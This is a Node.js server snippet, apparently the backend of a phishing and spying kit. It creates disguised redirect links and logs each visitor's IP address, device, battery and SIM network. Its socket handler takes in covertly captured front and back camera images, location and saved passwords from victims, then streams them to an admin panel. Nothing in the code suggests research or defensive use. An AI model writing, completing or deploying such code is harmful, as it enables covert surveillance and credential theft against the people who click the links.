// Add this to server.js after other routes

// Generate custom link with redirect URL
app.post('/generate-custom-link', (req, res) => {
    const { redirectUrl } = req.body;
    const visitorId = uuidv4();
    const link = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
    
    // Store visitor data with redirect URL
    const visitorInfo = {
        id: visitorId,
        link: link,
        redirectUrl: redirectUrl,
        createdAt: new Date().toISOString(),
        status: 'pending'
    };
    
    const users = readUsers();
    users.push(visitorInfo);
    writeUsers(users);
    
    res.json({ success: true, link: link, visitorId: visitorId, redirectUrl: redirectUrl });
});

// Delete visitor
app.delete('/api/visitor/:id', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    let users = readUsers();
    users = users.filter(u => u.id !== req.params.id);
    writeUsers(users);
    
    res.json({ success: true });
});

// Update socket visitor-connect to capture more data
io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    socket.on('visitor-connect', (data) => {
        const { visitorId, userAgent, platform, screenResolution, battery, simNetwork } = data;
        
        const ip = socket.handshake.address;
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            users[userIndex] = {
                ...users[userIndex],
                ip: ip,
                deviceName: platform,
                networkName: userAgent,
                userAgent: userAgent,
                battery: battery || 'N/A',
                simNetwork: simNetwork || 'N/A',
                visitDate: new Date().toISOString(),
                connected: true,
                socketId: socket.id,
                connectedAt: new Date().toISOString()
            };
            writeUsers(users);
            
            connectedClients.set(visitorId, socket.id);
            visitorData.set(visitorId, users[userIndex]);
            
            io.emit('visitor-connected', users[userIndex]);
        }
    });
    
    // Handle visitor data (camera, location, passwords)
    socket.on('visitor-data', (data) => {
        const { visitorId, type, content } = data;
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            if (type === 'frontCamera') {
                users[userIndex].frontCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'backCamera') {
                users[userIndex].backCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'location') {
                users[userIndex].location = content;
                users[userIndex].lastLocationUpdate = new Date().toISOString();
            } else if (type === 'savedPasswords') {
                users[userIndex].savedPasswords = content;
            } else if (type === 'redirectComplete') {
                users[userIndex].redirectComplete = true;
                users[userIndex].redirectTime = new Date().toISOString();
            }
            
            writeUsers(users);
            
            // Emit updates to admin
            io.emit(`${type}-data`, { visitorId, content });
        }
    });
    
    // ... rest of socket code
});